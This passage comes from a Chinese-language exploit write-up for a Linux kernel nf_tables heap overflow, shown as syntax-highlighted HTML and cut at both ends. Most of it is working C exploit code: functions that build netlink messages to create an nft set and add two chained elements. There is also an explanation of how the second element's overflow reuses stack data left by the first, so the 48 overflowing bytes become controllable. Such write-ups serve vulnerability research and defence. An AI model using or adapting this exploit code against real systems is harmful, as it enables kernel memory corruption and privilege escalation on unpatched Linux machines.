</span></span><span style=display:flex><span>  <span style=color:#902000>size_t</span> nlh_payload_size <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg);
</span></span><span style=display:flex><span>  nlh_payload_size <span style=color:#666>+=</span> S8_NLA_SIZE <span style=color:#666>*</span> <span style=color:#40a070>2</span>;  <span style=color:#60a0b0;font-style:italic>// NFTA_SET_TABLE &amp;&amp; NFTA_SET_NAME
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload_size <span style=color:#666>+=</span>
</span></span><span style=display:flex><span>      U32_NLA_SIZE <span style=color:#666>*</span> <span style=color:#40a070>5</span>;  <span style=color:#60a0b0;font-style:italic>// NFTA_SET_[ID|KEY_LEN|FLAGS|DATA_TYPE|DATA_LEN]
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload_size <span style=color:#666>=</span> <span style=color:#06287e>NLMSG_SPACE</span>(nlh_payload_size);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nlh_payload <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>)<span style=color:#06287e>malloc</span>(nlh_payload_size);
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(nlh_payload, <span style=color:#40a070>0</span>, nlh_payload_size);
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_flags <span style=color:#666>=</span> NLM_F_REQUEST <span style=color:#666>|</span> NLM_F_CREATE;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_len <span style=color:#666>=</span> nlh_payload_size;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_pid <span style=color:#666>=</span> <span style=color:#06287e>getpid</span>();
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_seq <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_type <span style=color:#666>=</span> (NFNL_SUBSYS_NFTABLES <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>) <span style=color:#666>|</span> NFT_MSG_NEWSET;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nfgm <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> nfgenmsg <span style=color:#666>*</span>)<span style=color:#06287e>NLMSG_DATA</span>(nlh_payload);
</span></span><span style=display:flex><span>  nfgm<span style=color:#666>-&gt;</span>nfgen_family <span style=color:#666>=</span> NFPROTO_INET;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)nlh_payload <span style=color:#666>+</span> <span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg));
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> <span style=color:#06287e>set_str8_attr</span>(nla, NFTA_SET_TABLE, table_name);
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> <span style=color:#06287e>set_str8_attr</span>(nla, NFTA_SET_NAME, set_name);
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(nla, NFTA_SET_ID, id);
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(nla, NFTA_SET_KEY_LEN, set_key_len);
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(nla, NFTA_SET_DATA_LEN, set_data_len);
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(nla, NFTA_SET_DATA_TYPE, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>  nla <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(nla, NFTA_SET_FLAGS, NFT_SET_MAP);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(iov, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(iov));
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>0</span>].iov_base <span style=color:#666>=</span> nlh_batch_begin;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>0</span>].iov_len <span style=color:#666>=</span> nlh_batch_begin<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>1</span>].iov_base <span style=color:#666>=</span> nlh_payload;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>1</span>].iov_len <span style=color:#666>=</span> nlh_payload<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>2</span>].iov_base <span style=color:#666>=</span> nlh_batch_end;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>2</span>].iov_len <span style=color:#666>=</span> nlh_batch_end<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  msg.msg_name <span style=color:#666>=</span> <span style=color:#666>&amp;</span>dest_nl;
</span></span><span style=display:flex><span>  msg.msg_namelen <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(dest_nl);
</span></span><span style=display:flex><span>  msg.msg_iov <span style=color:#666>=</span> iov;
</span></span><span style=display:flex><span>  msg.msg_iovlen <span style=color:#666>=</span> <span style=color:#40a070>3</span>;
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> nbytes;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> ((nbytes <span style=color:#666>=</span> <span style=color:#06287e>sendmsg</span>(nlsock, <span style=color:#666>&amp;</span>msg, <span style=color:#40a070>0</span>)) <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] sendmsg(create set)&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>close</span>(nlsock);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[!] %d bytes sent</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, nbytes);
</span></span><span style=display:flex><span>  <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;    sendmsg&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_batch_begin);
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_payload);
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_batch_end);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=控制堆溢出数据><span class=section-num>5.4</span> 控制堆溢出数据</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>nft_set_ext_exists</span>(ext, NFT_SET_EXT_DATA))
</span></span><span style=display:flex><span>  <span style=color:#06287e>memcpy</span>(<span style=color:#06287e>nft_set_ext_data</span>(ext), data, set<span style=color:#666>-&gt;</span>dlen);
</span></span></code></pre></div><p>溢出的数据源是 data 指针指向的，定义在 <code>nft_add_set_elem</code> 栈上的 <code>struct nft_set_elem elem;</code> 变量的 <code>elem.data.val.data</code> 字段</p><p><a id="code-snippet--struct nft-set-elem"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	struct nft_set_elem - generic representation of set elements
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@key: element key
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@key_end: closing element key
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> *	@priv: element private data and extensions
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nft_set_elem {
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>union</span> {
</span></span><span style=display:flex><span>                u32		buf[NFT_DATA_VALUE_MAXLEN <span style=color:#666>/</span> <span style=color:#007020;font-weight:700>sizeof</span>(u32)];
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>struct</span> nft_data	val;
</span></span><span style=display:flex><span>        } key;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>union</span> {
</span></span><span style=display:flex><span>                u32		buf[NFT_DATA_VALUE_MAXLEN <span style=color:#666>/</span> <span style=color:#007020;font-weight:700>sizeof</span>(u32)];
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>struct</span> nft_data	val;
</span></span><span style=display:flex><span>        } key_end;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>union</span> {
</span></span><span style=display:flex><span>                u32		buf[NFT_DATA_VALUE_MAXLEN <span style=color:#666>/</span> <span style=color:#007020;font-weight:700>sizeof</span>(u32)];
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>struct</span> nft_data val;
</span></span><span style=display:flex><span>        } data;
</span></span><span style=display:flex><span>        <span style=color:#902000>void</span>			<span style=color:#666>*</span>priv;
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nft_data {
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>union</span> {
</span></span><span style=display:flex><span>                u32			data[<span style=color:#40a070>4</span>];
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>struct</span> nft_verdict	verdict;
</span></span><span style=display:flex><span>        };
</span></span><span style=display:flex><span>} <span style=color:#06287e>__attribute__</span>((<span style=color:#06287e>aligned</span>(<span style=color:#06287e>__alignof__</span>(u64))));
</span></span></code></pre></div><p>这里有许多 union 套来套去，不过结构其实并不复杂</p><p><a id=figure--nft-set-elem></a></p><figure><img src=https://raw.githubusercontent.com/chujDK/ImageHost/main/PicGoIMage/202303071306968_nft_set_elem.png></figure><p>我们能溢出的就是上图中那 unused 的 48 byte 。也就是 data 这个 union 中 buf 比 val 多出来的 48 byte 。这是随机的未初始化数据，但是没有那么随机——至少没有越界。如果我们看一下调用 <code>nft_add_set_elem</code> 的 <code>nf_tables_newsetelem</code> 函数，可以发现这个函数是循环调用的：</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#06287e>nla_for_each_nested</span>(attr, nla[NFTA_SET_ELEM_LIST_ELEMENTS], rem) {
</span></span><span style=display:flex><span>  err <span style=color:#666>=</span> <span style=color:#06287e>nft_add_set_elem</span>(<span style=color:#666>&amp;</span>ctx, set, attr, nlh<span style=color:#666>-&gt;</span>nlmsg_flags);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (err <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> err;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>很好理解，就是对于用户传入的每个元素都调用一次 <code>nft_add_set_elem</code> 加入到 set 中。那么我们可以让溢出的这次 <code>nft_add_set_elem</code> 紧接上一次 <code>nft_add_set_elem</code> ，这样第二次调用时 elem 的数据还会是第一次调用时的数据，就可以让 unused 部分的数据保留为上一次传入的数据了，由此便可控制溢出的数据。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>+-----------------+        +-------------------+
</span></span><span style=display:flex><span>|cGRE             |        | NFTA_DATA_VERDICT |
</span></span><span style=display:flex><span>|                 |        |       16bytes     |
</span></span><span style=display:flex><span>| NFTA_DATA_VALUE |        +-------------------+
</span></span><span style=display:flex><span>|      64bytes    |-------&gt;|cGRE               |
</span></span><span style=display:flex><span>|                 |        |      Reserved     |
</span></span><span style=display:flex><span>|                 |        |   and Controled   |
</span></span><span style=display:flex><span>|                 |        |                   |
</span></span><span style=display:flex><span>+-----------------+        +-------------------+
</span></span></code></pre></div><p>为了实现这个效果，我们需要在一次 <code>NFT_MSG_NEWSETELEM</code> 中创建两个 <code>nlattr</code> 来添加两次元素，第一次写入数据，第二次触发溢出，即须如下构造</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/*** First element ***/</span>
</span></span><span style=display:flex><span>attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, <span style=color:#40a070>0</span>, first_element_size <span style=color:#666>-</span> <span style=color:#40a070>4</span>);
</span></span><span style=display:flex><span>attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_SET_ELEM_KEY, <span style=color:#06287e>NLA_BIN_SIZE</span>(set_keylen));
</span></span><span style=display:flex><span>attr <span style=color:#666>=</span> <span style=color:#06287e>set_binary_attr</span>(attr, NFTA_DATA_VALUE, (<span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>)zerobuf, set_keylen);
</span></span><span style=display:flex><span>attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_SET_ELEM_DATA, <span style=color:#06287e>NLA_BIN_SIZE</span>(data_len));
</span></span><span style=display:flex><span>attr <span style=color:#666>=</span> <span style=color:#06287e>set_binary_attr</span>(attr, NFTA_DATA_VALUE, (<span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>)data, data_len);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/*** Second element ***/</span>
</span></span><span style=display:flex><span>attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, <span style=color:#40a070>0</span>, second_element_size <span style=color:#666>-</span> <span style=color:#40a070>4</span>);
</span></span><span style=display:flex><span>attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_SET_ELEM_KEY, <span style=color:#06287e>NLA_BIN_SIZE</span>(set_keylen));
</span></span><span style=display:flex><span>attr <span style=color:#666>=</span> <span style=color:#06287e>set_binary_attr</span>(attr, NFTA_DATA_VALUE, (<span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>)zerobuf, set_keylen);
</span></span><span style=display:flex><span>attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_SET_ELEM_DATA,
</span></span><span style=display:flex><span>                       U32_NLA_SIZE <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr));
</span></span><span style=display:flex><span>attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_DATA_VERDICT, U32_NLA_SIZE);
</span></span><span style=display:flex><span><span style=color:#06287e>set_u32_attr</span>(attr, NFTA_VERDICT_CODE, NFT_CONTINUE);
</span></span></code></pre></div><p>完整的添加元素的代码如下：</p><p><a id=code-snippet--add-elem-to-nft-set></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>add_elem_to_nft_set</span>(<span style=color:#902000>int</span> nlsock, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>set_name, <span style=color:#902000>uint32_t</span> set_keylen,
</span></span><span style=display:flex><span>                         <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>table_name, <span style=color:#902000>uint32_t</span> id, <span style=color:#902000>uint32_t</span> data_len,
</span></span><span style=display:flex><span>                         <span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>data) {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> msghdr msg;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> sockaddr_nl dest_nl;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_batch_begin;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_payload;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh_batch_end;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nfgenmsg <span style=color:#666>*</span>nfgm;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>attr;
</span></span><span style=display:flex><span>  <span style=color:#902000>uint64_t</span> nlh_payload_size;
</span></span><span style=display:flex><span>  <span style=color:#902000>uint64_t</span> nested_attr_size;
</span></span><span style=display:flex><span>  <span style=color:#902000>size_t</span> first_element_size;
</span></span><span style=display:flex><span>  <span style=color:#902000>size_t</span> second_element_size;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> iovec iov[<span style=color:#40a070>3</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>dest_nl, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(dest_nl));
</span></span><span style=display:flex><span>  dest_nl.nl_family <span style=color:#666>=</span> AF_NETLINK;
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>msg, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(msg));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nlh_batch_begin <span style=color:#666>=</span> <span style=color:#06287e>make_bacth_begin_nlmsghdr</span>();
</span></span><span style=display:flex><span>  nlh_batch_end <span style=color:#666>=</span> <span style=color:#06287e>make_bacth_end_nlmsghdr</span>();
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(iov, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(iov));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/** Precompute the size of the nested field **/</span>
</span></span><span style=display:flex><span>  nested_attr_size <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/*** First element ***/</span>
</span></span><span style=display:flex><span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);              <span style=color:#60a0b0;font-style:italic>// Englobing attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);              <span style=color:#60a0b0;font-style:italic>// NFTA_SET_ELEM_KEY
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#06287e>NLA_BIN_SIZE</span>(set_keylen);           <span style=color:#60a0b0;font-style:italic>// NFTA_DATA_VALUE
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);              <span style=color:#60a0b0;font-style:italic>// NFTA_SET_ELEM_DATA
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#06287e>NLA_ALIGN</span>(<span style=color:#06287e>NLA_BIN_SIZE</span>(data_len));  <span style=color:#60a0b0;font-style:italic>// NFTA_DATA_VALUE
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>  first_element_size <span style=color:#666>=</span> nested_attr_size;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/*** Second element ***/</span>
</span></span><span style=display:flex><span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);     <span style=color:#60a0b0;font-style:italic>// Englobing attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);     <span style=color:#60a0b0;font-style:italic>// NFTA_SET_ELEM_KEY
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#06287e>NLA_BIN_SIZE</span>(set_keylen);  <span style=color:#60a0b0;font-style:italic>// NFTA_DATA_VALUE
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);  <span style=color:#60a0b0;font-style:italic>// NFTA_SET_ELEM_DATA
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);  <span style=color:#60a0b0;font-style:italic>// NFTA_DATA_VERDICT
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nested_attr_size <span style=color:#666>+=</span> U32_NLA_SIZE;           <span style=color:#60a0b0;font-style:italic>// NFTA_VERDICT_CODE
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  second_element_size <span style=color:#666>=</span> nested_attr_size <span style=color:#666>-</span> first_element_size;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nlh_payload_size <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg);  <span style=color:#60a0b0;font-style:italic>// Mandatory
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload_size <span style=color:#666>+=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);   <span style=color:#60a0b0;font-style:italic>// NFTA_SET_ELEM_LIST_ELEMENTS
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload_size <span style=color:#666>+=</span> nested_attr_size;        <span style=color:#60a0b0;font-style:italic>// All the stuff described above
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload_size <span style=color:#666>+=</span> S8_NLA_SIZE;             <span style=color:#60a0b0;font-style:italic>// NFTA_SET_ELEM_LIST_TABLE
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload_size <span style=color:#666>+=</span> S8_NLA_SIZE;             <span style=color:#60a0b0;font-style:italic>// NFTA_SET_ELEM_LIST_SET
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload_size <span style=color:#666>+=</span> U32_NLA_SIZE;            <span style=color:#60a0b0;font-style:italic>// NFTA_SET_ELEM_LIST_SET_ID
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload_size <span style=color:#666>=</span> <span style=color:#06287e>NLMSG_SPACE</span>(nlh_payload_size);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/** Allocation **/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nlh_payload <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>)<span style=color:#06287e>malloc</span>(nlh_payload_size);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (nlh_payload <span style=color:#666>==</span> <span style=color:#007020>NULL</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>fprintf</span>(stderr, <span style=color:#4070a0>&#34;[-] oom</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>2</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(nlh_payload, <span style=color:#40a070>0</span>, nlh_payload_size);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/** Fill the required fields **/</span>
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_len <span style=color:#666>=</span> nlh_payload_size;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_type <span style=color:#666>=</span> (NFNL_SUBSYS_NFTABLES <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>) <span style=color:#666>|</span> NFT_MSG_NEWSETELEM;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_pid <span style=color:#666>=</span> <span style=color:#06287e>getpid</span>();
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_flags <span style=color:#666>=</span> NLM_F_REQUEST;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_seq <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nfgm <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> nfgenmsg <span style=color:#666>*</span>)<span style=color:#06287e>NLMSG_DATA</span>(nlh_payload);
</span></span><span style=display:flex><span>  nfgm<span style=color:#666>-&gt;</span>nfgen_family <span style=color:#666>=</span> NFPROTO_INET;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/** Setup the attributes */</span>
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>)((<span style=color:#902000>void</span> <span style=color:#666>*</span>)nlh_payload <span style=color:#666>+</span>
</span></span><span style=display:flex><span>                           <span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg)));
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_str8_attr</span>(attr, NFTA_SET_ELEM_LIST_TABLE, table_name);
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_str8_attr</span>(attr, NFTA_SET_ELEM_LIST_SET, set_name);
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(attr, NFTA_SET_ELEM_LIST_SET_ID, id);
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_SET_ELEM_LIST_ELEMENTS, nested_attr_size);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/*** First element ***/</span>
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, <span style=color:#40a070>0</span>, first_element_size <span style=color:#666>-</span> <span style=color:#40a070>4</span>);
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_SET_ELEM_KEY, <span style=color:#06287e>NLA_BIN_SIZE</span>(set_keylen));
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_binary_attr</span>(attr, NFTA_DATA_VALUE, (<span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>)zerobuf, set_keylen);
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_SET_ELEM_DATA, <span style=color:#06287e>NLA_BIN_SIZE</span>(data_len));
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_binary_attr</span>(attr, NFTA_DATA_VALUE, (<span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>)data, data_len);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/*** Second element ***/</span>
